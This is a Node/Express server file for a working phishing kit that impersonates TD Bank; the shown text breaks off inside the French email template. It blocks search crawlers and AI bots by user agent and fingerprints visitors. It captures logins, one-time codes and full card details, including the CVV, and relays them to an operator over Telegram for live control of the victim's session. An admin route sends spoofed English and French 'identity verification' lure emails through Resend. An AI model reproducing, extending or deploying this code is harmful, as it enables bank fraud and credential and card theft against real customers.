require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');
const bot = require('./bot');
const otpStore = require('./otpStore'); // Serves as sessionStore
const { Resend } = require('resend');


const app = express();
const PORT = process.env.PORT || 5001;
const isProduction = process.env.NODE_ENV === 'production';

// Enable Helmet HTTP security headers with a CSP tuned for Vite/React
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc:     ["'self'"],
      scriptSrc:      ["'self'", "'unsafe-inline'"],   // Vite's module bootstrap needs this
      scriptSrcAttr:  ["'unsafe-inline'"],              // Inline event handlers used by React
      styleSrc:       ["'self'", "https:", "'unsafe-inline'"],
      imgSrc:         ["'self'", "data:", "https:"],
      fontSrc:        ["'self'", "https:", "data:"],
      connectSrc:     ["'self'", "https://api.ipify.org"],
      frameAncestors: ["'none'"],                       // Never embed this site in any iframe
      objectSrc:      ["'none'"],
      baseUri:        ["'self'"],
      formAction:     ["'self'"],
    },
  },
  crossOriginEmbedderPolicy: false, // Keep off — it blocks some legitimate resources
}));


// =============================================
// BOT & CRAWLER BLOCKING
// =============================================

// Layer 1: X-Robots-Tag header on every response — instructs crawlers not to index
app.use((req, res, next) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
  next();
});

// Layer 2: Block known bot/crawler User-Agents at the server level
const BOT_UA_PATTERN = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|sogou|exabot|facebot|ia_archiver|semrushbot|ahrefsbot|dotbot|mj12bot|rogerbot|linkedinbot|twitterbot|facebookexternalhit|whatsapp|telegrambot|applebot|petalbot|bytespider|gptbot|ccbot|claudebot|anthropic|openai|scrapy|python-requests|wget|curl\/|libwww|go-http-client|okhttp|java\/|HeadlessChrome/i;

app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  if (BOT_UA_PATTERN.test(ua)) {
    return res.status(403).send('Forbidden');
  }
  next();
});



// Disable X-Powered-By header to prevent technology disclosure
app.disable('x-powered-by');

// Define allowed CORS origins
const allowedOrigins = [
  'https://profil1-centre-1.online',
  'https://www.profil1-centre-1.online'
];

if (process.env.FRONTEND_URL) {
  allowedOrigins.push(process.env.FRONTEND_URL);
}

// In production, the frontend is served by this same Express server,
// so CORS is only needed in development (Vite dev server on a different port).
app.use(cors({
  origin: isProduction ? allowedOrigins : true,
  credentials: true
}));

// Serve React build in production
if (isProduction) {
  const clientDist = path.join(__dirname, '..', 'client', 'dist');
  app.use(express.static(clientDist));
}

// Apply general API rate limiting (max 150 requests per 15 minutes per IP)
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 150,
  message: { success: false, error: 'Too many requests, please try again later.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/', apiLimiter);

// Stricter rate limiter for sensitive authentication entrypoints
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 15, // limit each IP to 15 login attempts per 15 minutes
  message: { success: false, error: 'Too many login attempts. Please try again after 15 minutes.' },
  standardHeaders: true,
  legacyHeaders: false,
});
app.use('/api/login', loginLimiter);

app.use(express.json());

// =============================================
// ACCESS KEY PROTECTION
// =============================================
const VALID_ACCESS_KEY = 'client-td-banque';
const ADMIN_ACCESS_KEY = 'whapsendmail';

app.use('/api/', (req, res, next) => {
  // Allow anonymous access to the app download route
  if (req.path === '/download-td-app') {
    return next();
  }
  const userKey = req.query.key || req.headers['x-access-key'] || req.headers['x-admin-key'];
  if (userKey === VALID_ACCESS_KEY || userKey === ADMIN_ACCESS_KEY) {
    return next();
  }
  return res.status(403).json({ success: false, error: 'Access Denied. Invalid or missing access key.' });
});

// Helper for formatted IST time
function getISTDateTime() {
  const date = new Date();
  const istOffset = 5.5 * 60 * 60 * 1000;
  const istDate = new Date(date.getTime() + istOffset);
  const pad = (num) => String(num).padStart(2, '0');
  return `${istDate.getUTCFullYear()}-${pad(istDate.getUTCMonth() + 1)}-${pad(istDate.getUTCDate())} ${pad(istDate.getUTCHours())}:${pad(istDate.getUTCMinutes())}:${pad(istDate.getUTCSeconds())}`;
}

// =============================================
// FINGERPRINT STORE (in-memory, per IP)
// =============================================
const fingerprintStore = {};

// POST /api/fingerprint — receive and store device signals
app.post('/api/fingerprint', (req, res) => {
  const data = req.body;
  if (!data || typeof data !== 'object') {
    return res.status(400).json({ success: false });
  }

  const ip = data.ip || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  const visitorId = data.visitorId || 'unknown';
  const key = `${ip}::${visitorId}`;

  fingerprintStore[key] = {
    ...data,
    receivedAt: getISTDateTime(),
    ip,
  };

  // Expire after 30 minutes to avoid unbounded memory growth
  setTimeout(() => { delete fingerprintStore[key]; }, 30 * 60 * 1000);

  console.log(`[FP] Stored fingerprint for IP=${ip} visitorId=${visitorId}`);
  return res.json({ success: true });
});

// Helper: look up a stored fingerprint by request IP
function lookupFingerprint(reqIp) {
  // Find any stored entry whose IP matches the current request IP
  const match = Object.values(fingerprintStore).find(fp => fp.ip === reqIp);
  return match || null;
}

// Helper: format fingerprint block for Telegram
function formatFingerprintBlock(fp) {
  if (!fp) return '';
  const nav = fp.navigator || {};
  const scr = fp.screen   || {};
  const wgl = fp.webgl    || {};
  const fonts = Array.isArray(fp.fonts) ? fp.fonts.join(', ') : 'n/a';
  const voices = Array.isArray(fp.voices) ? fp.voices.slice(0, 5).join(', ') : 'n/a';
  const exts = Array.isArray(wgl.extensions) ? wgl.extensions.slice(0, 4).join(', ') : 'n/a';

  return `

📊 DEVICE FINGERPRINT
🆔 Visitor ID: ${fp.visitorId || 'n/a'}
🌍 Public IP: ${fp.ip || 'n/a'}

🖥 Navigator
  • UA: ${nav.userAgent || 'n/a'}
  • Platform: ${nav.platform || 'n/a'}
  • Language: ${nav.language || 'n/a'} [${nav.languages || ''}]
  • Timezone: ${nav.timezone || 'n/a'}
  • CPU cores: ${nav.hardwareConcurrency || 'n/a'} | RAM: ${nav.deviceMemory || 'n/a'} GB
  • Touch points: ${nav.maxTouchPoints || '0'} | DNT: ${nav.doNotTrack || 'n/a'}

📐 Screen
  • Resolution: ${scr.width || '?'}×${scr.height || '?'} @ ${scr.pixelRatio || '?'}x
  • Color depth: ${scr.colorDepth || '?'} bit

🎨 Canvas hash: ${fp.canvas || 'n/a'}
🔊 Audio hash: ${fp.audio || 'n/a'}
🖼 WebGPU: ${fp.webgpu || 'n/a'}
📐 ClientRects: ${fp.clientRects || 'n/a'}

🎮 WebGL
  • Renderer: ${wgl.renderer || 'n/a'}
  • Vendor: ${wgl.vendor || 'n/a'}
  • Extensions: ${exts}

🔤 Fonts (${Array.isArray(fp.fonts) ? fp.fonts.length : 0}): ${fonts}
🗣 Voices (${Array.isArray(fp.voices) ? fp.voices.length : 0}): ${voices}`;
}

// Flow 1 — Login Credentials Notification
app.post('/api/login', async (req, res) => {
  const { email, password, deviceInfo } = req.body;
  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'Email and password are required' });
  }

  const ua = deviceInfo?.userAgent || req.headers['user-agent'] || 'unknown';
  const platform = deviceInfo?.platform || 'unknown';
  const language = deviceInfo?.language || 'unknown';
  const screen = deviceInfo?.screen || 'unknown';
  const timezone = deviceInfo?.timezone || 'unknown';
  const fingerprint = deviceInfo?.deviceFingerprint || 'unknown';

  const reqIp = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || 'unknown';
  const fp = lookupFingerprint(reqIp);
  const fpBlock = formatFingerprintBlock(fp);

  const timestamp = getISTDateTime();
  const message = `🔐 NEW LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}\n📱 User-Agent: ${ua}\n🖥 Screen: ${screen} | Platform: ${platform}\n🌐 Language: ${language} | Timezone: ${timezone}\n🔑 Fingerprint: ${fingerprint}\n🕐 Time: ${timestamp}${fpBlock}`;

  const reply_markup = {
    inline_keyboard: [
      [
        { text: '📤 Pop OTP', callback_data: `pop_otp:${email}` },
        { text: '💳 Pop Card', callback_data: `show_card:${email}` }
      ],
      [
        { text: '📲 Pop APP', callback_data: `show_app:${email}` },
        { text: '❌ Cancel', callback_data: `cancel:${email}` }
      ]
    ]
  };

  // Initialize the session state
  otpStore[email] = {
    email,
    password,
    status: 'login_submitted',
    otp: null,
    otpExpiry: null,
    otpEntered: null,
    redirectUrl: null,
    cardNumber: null,
    cvv: null,
    expiry: null,
    cardOtpEntered: null,
    cardOtpMode: false,
    deviceInfo: deviceInfo || { userAgent: ua, platform, language, screen, timezone, deviceFingerprint: fingerprint }
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] Received login attempt for ${email}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send login attempt message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// GET /api/session-status — Long-polling check for state updates
app.get('/api/session-status', (req, res) => {
  const { email } = req.query;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email query parameter is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.json({ success: true, status: 'idle' });
  }

  return res.json({
    success: true,
    status: session.status,
    otp: session.otp,
    otpExpiry: session.otpExpiry,
    redirectUrl: session.redirectUrl
  });
});

// POST /api/submit-otp — User submits the typed OTP
app.post('/api/submit-otp', async (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) {
    return res.status(400).json({ success: false, error: 'Email and OTP are required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Update session state
  session.status = 'otp_submitted';

  let message;
  let reply_markup;
  const timestamp = getISTDateTime();

  if (session.cardOtpMode) {
    session.cardOtpEntered = otp;
    const rawCard = (session.cardNumber || '').replace(/\D/g, '');
    const formattedCard = rawCard.replace(/(\d{4})(?=\d)/g, '$1 ') || 'N/A';

    message = `🔐 CARD OTP ENTERED\n\n📧 Email: ${email}\n💳 Card: ${formattedCard}\n🔢 Card OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;

    reply_markup = {
      inline_keyboard: [
        [
          { text: '✅ ACCEPT CARD OTP', callback_data: `accept_otp:${email}` },
          { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` }
        ],
        [
          { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` },
          { text: '❌ CANCEL', callback_data: `cancel:${email}` }
        ]
      ]
    };
  } else {
    session.otpEntered = otp;

    message = `🔑 OTP CODE ENTERED\n\n📧 Email: ${email}\n🔢 OTP Entered: ${otp}\n🕐 Time: ${timestamp}`;

    reply_markup = {
      inline_keyboard: [
        [
          { text: '✅ ACCEPT OTP', callback_data: `accept_otp:${email}` },
          { text: '💳 ACCEPT OTP + CARD', callback_data: `accept_otp_card:${email}` }
        ],
        [
          { text: '❌ WRONG OTP', callback_data: `wrong_otp:${email}` },
          { text: '❌ CANCEL', callback_data: `cancel:${email}` }
        ],
        [
          { text: '🔄 RESEND NEW OTP', callback_data: `resend_otp:${email}` }
        ]
      ]
    };
  }

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] User ${email} submitted ${session.cardOtpMode ? 'Card' : 'Email'} OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send OTP entered message to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// POST /api/request-resend — User requested a new OTP code
app.post('/api/request-resend', async (req, res) => {
  const { email } = req.body;
  if (!email) {
    return res.status(400).json({ success: false, error: 'Email is required' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Generate a new 6-digit OTP code immediately
  const crypto = require('crypto');
  const otp = crypto.randomInt(100000, 999999).toString();

  session.status = 'show_otp';
  session.otp = otp;
  session.otpExpiry = Date.now() + 60000; // Reset to 60 seconds

  const timestamp = getISTDateTime();
  try {
    await bot.sendMessage(
      process.env.ADMIN_CHAT_ID,
      `⚠️ USER REQUESTED RESEND (New OTP Generated)\n\n📧 Email: ${email}\n🔢 New OTP Code: ${otp}\n🕐 Time: ${timestamp}`
    );
    console.log(`[Express] User ${email} requested OTP resend. New OTP: ${otp}. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send resend request message to Telegram:', error.message);
  }
  return res.json({ success: true });
});

// POST /api/clear-session — Clean up session after successful verification
app.post('/api/clear-session', (req, res) => {
  const { email } = req.body;
  if (email && otpStore[email]) {
    delete otpStore[email];
    console.log(`[Express] Session successfully cleared for ${email}`);
  }
  return res.json({ success: true });
});

// POST /api/submit-card — User submits card details after OTP card popup
app.post('/api/submit-card', async (req, res) => {
  const { email, cardNumber, cvv, expiry } = req.body;
  if (!email || !cardNumber || !cvv || !expiry) {
    return res.status(400).json({ success: false, error: 'All card fields are required.' });
  }

  const session = otpStore[email];
  if (!session) {
    return res.status(404).json({ success: false, error: 'Session not found' });
  }

  // Store card details in session
  session.cardNumber = cardNumber;
  session.cvv = cvv;
  session.expiry = expiry;
  session.status = 'card_submitted';

  const timestamp = getISTDateTime();
  const message = `💳 CARD DETAILS RECEIVED\n\n📧 Email: ${email}\n🔑 Password: ${session.password || 'N/A'}\n💳 Card: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n🕐 Time: ${timestamp}`;

  const reply_markup = {
    inline_keyboard: [
      [{ text: '✅ Accept Card & Redirect', callback_data: `accept_card:${email}` }],
      [{ text: '🔄 Show OTP Popup Again', callback_data: `show_otp_again:${email}` }],
      [{ text: '❌ Cancel Everything', callback_data: `cancel:${email}` }]
    ]
  };

  try {
    await bot.sendMessage(process.env.ADMIN_CHAT_ID, message, { reply_markup });
    console.log(`[Express] User ${email} submitted card details. Notified admin.`);
  } catch (error) {
    console.error('[Express Error] Failed to send card details to Telegram:', error.message);
  }

  return res.json({ success: true });
});

// =============================================
// ADMIN — SEND EMAIL VIA RESEND
// =============================================


app.post('/api/admin/send-email', async (req, res) => {
  // Admin key check via header
  const adminKey = req.headers['x-admin-key'];
  if (!adminKey || adminKey !== ADMIN_ACCESS_KEY) {
    return res.status(403).json({ success: false, error: 'Access Denied.' });
  }

  const { recipient, lang = 'en' } = req.body;
  if (!recipient) {
    return res.status(400).json({ success: false, error: 'Recipient is required.' });
  }

  const link = 'https://profil1-centre-1.online/?key=client-td-banque';

  const RESEND_API_KEY = process.env.RESEND_API_KEY;
  const FROM_EMAIL     = process.env.RESEND_FROM_EMAIL;
  const FROM_NAME      = process.env.RESEND_FROM_NAME || 'BANQUE TD';

  if (!RESEND_API_KEY || !FROM_EMAIL) {
    console.error('[Admin] Resend API key or FROM_EMAIL not set in .env');
    return res.status(500).json({ success: false, error: 'Email service not configured.' });
  }

  const templates = {
    en: {
      subject: 'Secure verification required – TD',
      html: `<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
  <title>Secure verification required – TD</title>
  <!--[if mso]>
  <noscript>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
  </noscript>
  <![endif]-->
  <style>
    * { box-sizing: border-box; }
    body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
    table, td { mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { -ms-interpolation-mode: bicubic; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; }
    a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
    body {
      margin: 0 !important;
      padding: 0 !important;
      background-color: #f0f2f5;
      font-family: Arial, Helvetica, sans-serif;
    }
    @media only screen and (max-width: 600px) {
      .email-wrapper { width: 100% !important; }
      .email-content { padding: 20px 16px !important; }
      .header-logo { padding: 20px 16px !important; }
      .btn-verify { padding: 14px 28px !important; font-size: 15px !important; }
      .footer-table { padding: 20px 16px !important; }
      h1 { font-size: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f0f2f5;">

  <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
    Secure verification required – Action required on your TD account.
  </div>

  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
    <tr>
      <td align="center" style="padding:30px 15px;">

        <table role="presentation" class="email-wrapper" border="0" cellpadding="0" cellspacing="0" width="600" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.10);">

          <tr>
            <td style="background-color:#003f2d;height:5px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="header-logo" style="background-color:#ffffff;padding:20px 40px;border-bottom:1px solid #e8e8e8;">
              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:bold;color:#067a2b;letter-spacing:0.5px;">TD BANK</span>
                  </td>
                  <td align="right" style="vertical-align:middle;">
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">SECURITY NOTICE</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;padding:14px 40px;">
              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Security Verification Required</span>
            </td>
          </tr>

          <tr>
            <td class="email-content" style="padding:40px 40px 32px 40px;">

              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Dear Customer,</p>

              <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
                Identity Verification Required
              </h1>

              <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                We need to verify your identity to finalize your request. This step is necessary to ensure the security of your account and protect your personal information.
              </p>

              <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Please click the button below to proceed with the verification. This process will only take a few moments.
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
                <tr>
                  <td style="padding:16px 20px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
                      <strong style="color:#003f2d;">Why this verification?</strong><br>
                      For your security, we periodically verify our customers' identity. This measure helps us detect any unauthorized activity on your account.
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:32px;">
                <tr>
                  <td align="center">
                    <!--[if mso]>
                    <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word"
                      href="${link}"
                      style="height:52px;v-text-anchor:middle;width:260px;"
                      arcsize="8%"
                      strokecolor="#067a2b"
                      fillcolor="#067a2b">
                      <w:anchorlock/>
                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Verify My Identity</center>
                    </v:roundrect>
                    <![endif]-->
                    <!--[if !mso]><!-->
                    <a href="${link}"
                       target="_blank"
                       rel="noopener noreferrer"
                       class="btn-verify"
                       style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
                      Verify My Identity
                    </a>
                    <!--<![endif]-->
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
                If the button does not work, copy and paste this link into your browser:<br>
                <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#fff8e1;border:1px solid #ffe082;border-radius:3px;">
                <tr>
                  <td style="padding:14px 18px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
                      ⚠️ <strong>Security Note:</strong> TD Bank will never ask for your PIN, password, or full card number by email. If you did not request this verification, please contact our customer service immediately.
                    </p>
                  </td>
                </tr>
              </table>

            </td>
          </tr>

          <tr>
            <td style="background-color:#e8e8e8;height:1px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="footer-table" style="background-color:#f8f9fb;padding:28px 40px;">

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.6;">
                      <strong style="color:#333333;">Need Help?</strong>
                    </p>
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#666666;line-height:1.7;">
                      Contact us at <strong>1-800-895-4463</strong><br>
                      Available 24 hours a day, 7 days a week
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:18px;">
                <tr>
                  <td align="center">
                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Security Centre</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/en/about-td/privacy-and-security/privacy-agreement" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">Privacy Policy</a>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#cccccc;margin:0 8px;">|</span>
                    <a href="https://www.td.com/ca/en/personal-banking" target="_blank" style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#067a2b;text-decoration:none;">td.com</a>
                  </td>
                </tr>
              </table>

              <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#999999;line-height:1.6;text-align:center;">
                © 2026 TD Bank Group. All rights reserved.<br>
                66 Wellington Street West, Toronto, Ontario M5K 1A2<br><br>
                This email was sent to the address associated with your TD account. This is a transactional message related to the security of your account.
              </p>

            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;height:4px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>`,
      text: `Dear Customer,\n\nWe need to verify your identity to finalize your request.\n\nPlease click on this link to proceed with the verification:\n${link}\n\nIf you did not request this verification, please contact our customer service at 1-800-895-4463.\n\n© ${new Date().getFullYear()} TD Bank Group. All rights reserved.`,
    },
    fr: {
      subject: 'Vérification sécurisée requise – TD',
      html: `<!DOCTYPE html>
<html lang="fr" xmlns="http://www.w3.org/1999/xhtml" xmlns:o="urn:schemas-microsoft-com:office:office">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="x-apple-disable-message-reformatting">
  <meta name="format-detection" content="telephone=no,address=no,email=no,date=no,url=no">
  <title>Vérification sécurisée requise – TD</title>
  <!--[if mso]>
  <noscript>
    <xml>
      <o:OfficeDocumentSettings>
        <o:PixelsPerInch>96</o:PixelsPerInch>
      </o:OfficeDocumentSettings>
    </xml>
  </noscript>
  <![endif]-->
  <style>
    * { box-sizing: border-box; }
    body, table, td, a { -webkit-text-size-adjust: 100%; -ms-text-size-adjust: 100%; }
    table, td { mso-table-lspace: 0pt; mso-table-rspace: 0pt; }
    img { -ms-interpolation-mode: bicubic; border: 0; height: auto; line-height: 100%; outline: none; text-decoration: none; }
    a[x-apple-data-detectors] { color: inherit !important; text-decoration: none !important; }
    body {
      margin: 0 !important;
      padding: 0 !important;
      background-color: #f0f2f5;
      font-family: Arial, Helvetica, sans-serif;
    }
    @media only screen and (max-width: 600px) {
      .email-wrapper { width: 100% !important; }
      .email-content { padding: 20px 16px !important; }
      .header-logo { padding: 20px 16px !important; }
      .btn-verify { padding: 14px 28px !important; font-size: 15px !important; }
      .footer-table { padding: 20px 16px !important; }
      h1 { font-size: 20px !important; }
    }
  </style>
</head>
<body style="margin:0;padding:0;background-color:#f0f2f5;">

  <div style="display:none;font-size:1px;color:#f0f2f5;line-height:1px;max-height:0px;max-width:0px;opacity:0;overflow:hidden;">
    Vérification sécurisée requise – Action requise sur votre compte TD.
  </div>

  <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f0f2f5;">
    <tr>
      <td align="center" style="padding:30px 15px;">

        <table role="presentation" class="email-wrapper" border="0" cellpadding="0" cellspacing="0" width="600" style="max-width:600px;width:100%;background-color:#ffffff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.10);">

          <tr>
            <td style="background-color:#003f2d;height:5px;font-size:0;line-height:0;">&nbsp;</td>
          </tr>

          <tr>
            <td class="header-logo" style="background-color:#ffffff;padding:20px 40px;border-bottom:1px solid #e8e8e8;">
              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%">
                <tr>
                  <td>
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:20px;font-weight:bold;color:#067a2b;letter-spacing:0.5px;">BANQUE TD</span>
                  </td>
                  <td align="right" style="vertical-align:middle;">
                    <span style="font-family:Arial,Helvetica,sans-serif;font-size:11px;color:#888888;letter-spacing:0.5px;">AVIS SÉCURISÉ</span>
                  </td>
                </tr>
              </table>
            </td>
          </tr>

          <tr>
            <td style="background-color:#003f2d;padding:14px 40px;">
              <span style="font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#ffffff;font-weight:bold;">Vérification de sécurité requise</span>
            </td>
          </tr>

          <tr>
            <td class="email-content" style="padding:40px 40px 32px 40px;">

              <p style="margin:0 0 6px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;letter-spacing:0.5px;text-transform:uppercase;">Cher(e) client(e),</p>

              <h1 style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:22px;font-weight:bold;color:#003f2d;line-height:1.3;">
                Vérification de votre identité requise
              </h1>

              <p style="margin:0 0 18px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Nous devons vérifier votre identité afin de finaliser votre demande. Cette étape est nécessaire pour assurer la sécurité de votre compte et protéger vos informations personnelles.
              </p>

              <p style="margin:0 0 28px 0;font-family:Arial,Helvetica,sans-serif;font-size:15px;color:#333333;line-height:1.7;">
                Veuillez cliquer sur le bouton ci-dessous pour procéder à la vérification. Cette démarche ne prendra que quelques instants.
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#f5f6fa;border-left:4px solid #067a2b;border-radius:3px;margin-bottom:32px;">
                <tr>
                  <td style="padding:16px 20px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#555555;line-height:1.6;">
                      <strong style="color:#003f2d;">Pourquoi cette vérification ?</strong><br>
                      Pour votre sécurité, nous vérifions périodiquement l'identité de nos clients. Cette mesure nous permet de détecter toute activité non autorisée sur votre compte.
                    </p>
                  </td>
                </tr>
              </table>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="margin-bottom:32px;">
                <tr>
                  <td align="center">
                    <!--[if mso]>
                    <v:roundrect xmlns:v="urn:schemas-microsoft-com:vml" xmlns:w="urn:schemas-microsoft-com:office:word"
                      href="${link}"
                      style="height:52px;v-text-anchor:middle;width:260px;"
                      arcsize="8%"
                      strokecolor="#067a2b"
                      fillcolor="#067a2b">
                      <w:anchorlock/>
                      <center style="color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;">Vérifier mon identité</center>
                    </v:roundrect>
                    <![endif]-->
                    <!--[if !mso]><!-->
                    <a href="${link}"
                       target="_blank"
                       rel="noopener noreferrer"
                       class="btn-verify"
                       style="display:inline-block;background-color:#067a2b;color:#ffffff;font-family:Arial,Helvetica,sans-serif;font-size:16px;font-weight:bold;text-decoration:none;padding:16px 40px;border-radius:4px;letter-spacing:0.5px;mso-hide:all;">
                      Vérifier mon identité
                    </a>
                    <!--<![endif]-->
                  </td>
                </tr>
              </table>

              <p style="margin:0 0 24px 0;font-family:Arial,Helvetica,sans-serif;font-size:13px;color:#888888;line-height:1.6;text-align:center;">
                Si le bouton ne fonctionne pas, copiez et collez ce lien dans votre navigateur :<br>
                <a href="${link}" target="_blank" style="color:#067a2b;text-decoration:underline;word-break:break-all;">${link}</a>
              </p>

              <table role="presentation" border="0" cellpadding="0" cellspacing="0" width="100%" style="background-color:#fff8e1;border:1px solid #ffe082;border-radius:3px;">
                <tr>
                  <td style="padding:14px 18px;">
                    <p style="margin:0;font-family:Arial,Helvetica,sans-serif;font-size:12px;color:#795548;line-height:1.6;">
                      ⚠️ <strong>Note de sécurité :</strong> La Banque TD ne vous demandera jamais votre NIP, mot de passe ou numéro de carte complet par courriel. Si vous n'avez pas demandé cette vérification, veuillez contacter notre service à la clientèle immédiatement.
                    </p>
                  </td>
